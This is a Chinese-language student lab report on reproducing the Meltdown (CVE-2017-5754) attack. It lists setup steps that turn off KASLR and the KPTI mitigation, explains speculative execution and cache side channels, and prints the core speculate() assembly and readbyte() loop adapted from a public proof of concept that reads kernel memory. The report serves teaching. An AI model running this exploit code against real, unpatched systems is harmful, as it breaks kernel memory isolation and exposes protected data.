## 操作系统实验四
### <center> ------Meltdown(CVE-2017-5754) Attack

-------------------------------
### 实验环境:  
 > - Release :  Ubuntu 16.04(LTS)
 > - Kernel :   Linux 4.13.0-45-generic  #x86_64
 > - CPU :   Intel(R) Core(TM) i7-6500U CPU @ 2.50GHz
### 实验准备：
> - 关闭KALSR
>     -  sudo perl -i -pe 'm/quiet/ and s//quiet nokaslr/' /etc/default/grub
>     - sudo update-grub 
> - 禁用kpi补丁
> - 设置CPU频率为最大性能
>     - cpufreq-set -g performance 
>     
> **检测实验环境是否满足**
>  
> ![Alt text](https://github.com/OSH-2018/4-uniqueufo/blob/master/1.png)


---------------------------------------------
### 实验原理
> Meltdown 利用Intel CPU的乱序执行漏洞，通过对内存的响应时间差来建立一个侧信道攻击，以此读取整个内核空间。
> - 1.乱序执行：
> &emsp; &emsp; intel CPU中自然也是使用了乱序执行，在执行单元等待从内存中取出数据的时间间隙，执行单元会去准备后面的指令。这种行为虽然提高了工作效率，但是也会产生副作用，meltdown就是利用了该行为产生的时间差来取得信息。
> 对于非乱序执行：
> &emsp; &emsp;取指令—>运行指令—>检测到异常—>清除数据—>退出
> 但是由于乱序执行，CPU提前执行了后续的非法指令：
> &emsp; &emsp;取指令—>运行指令1—>...—>非法指令—>...—>检测异常—>清除数据—>退出
> 利用这个窗口期可以建立侧信道攻击。
> - 2.侧信道攻击：
> &emsp;&emsp;指不去攻击信道本身来获得信息，而是通过观信道双方通信时产生的其他影响，通过分析泄露的额外信息来建立映射，进而取得信息。例如可以不断遍历加载探测数组，由于该数据此时已经在缓存中，攻击者总会遍历出一个加载时间远小于其它的数据，推测哪个内存页被访问过了，从而推断出被访问的内核内存数据。

> Meltdown通过cache泄露的额外信息，建立了一个侧信道攻击，来取得非授权地址内的信息。 


> *本次实验参考了github上著名的POC* 该POC能利用应用程序读取内核中的linux_proc_banner变量，这个变量存储了Linux内核的版本信息，可以通过命令cat /proc/version获取。cat /proc/version触发了系统调用将linux_proc_banner变量的信息返回给应用程序。而利用meltdown漏洞可以直接从应用程序中访问linux_proc_banner变量，破坏了内存隔离。

------------------------------------
### 主要函数
```x86asm
speculate(unsigned long addr)
{
    asm volatile (
    "1:\n\t"

    ".rept 300\n\t"
    "add $0x141, %%rax\n\t"//加法指令，重复300次，作用是测试处理器能乱序执行成功
    ".endr\n\t"

    "movzx (%[addr]), %%eax\n\t"//将目标内核地址所指向的数据放入eax寄存器中，该操作会触发处理器异常
    "shl $12, %%rax\n\t"//左移12位，也就是乘以4K，大小与target_array数组的列相等，为推测内核地址指向的数据做准备。
    "jz 1b\n\t"
    "movzx (%[target], %%rax, 1), %%rbx\n"//以目标内核地址指向的数据乘以4096作为索引访问target_array数组，
                                          // 这时，不同的数据将会被加载到不同的缓存页面中，这个过程是典型的缓存侧信道攻击。
    "stopspeculate: \n\t"
    "nop\n\t"
    :
    : [target] "r" (target_array),
    [addr] "r" (addr)
    : "rax", "rbx"
    );
}
```

```cpp
int readbyte(int fd, unsigned long addr)//循环调用clflush_target(),speculate(addr),check()
{
    int i, ret = 0, max = -1, maxi = -1;
    static char buf[256];

    memset(hist, 0, sizeof(hist));

    for (i = 0; i < CYCLES; i++) {//为提高准确性，循环1000次攻击流程
        ret = pread(fd, buf, sizeof(buf), 0);
        if (ret < 0) {
            perror("pread");
            break;
        }

        clflush_target();//冲洗掉target_array的缓存
        _mm_mfence();

        speculate(addr);//攻击
        check();//检测不同内存数据访问的时间差异来探测被缓存过的数据
    }
    for (i = 1; i < VARIANTS_READ; i++) {
        if (!isprint(i))
            continue;
        if (hist[i] && hist[i] > max) {
            max = hist[i];
            maxi = i;
        }
    }

    return maxi;
}
```
-------------------------------------------
### 实验结果
![Alt text](https://github.com/OSH-2018/4-uniqueufo/blob/master/2.png)


-------------------------------------------
> **参考资料**
> - https://github.com/paboldin/meltdown-exploit
> - http://www.cryptobadger.com/2018/01/linux-meltdown-spectre-patch-destroys-mining-hashrates-fix/
> - https://blog.hackerchai.com/meltdown-exploit-on-linux-opensource/
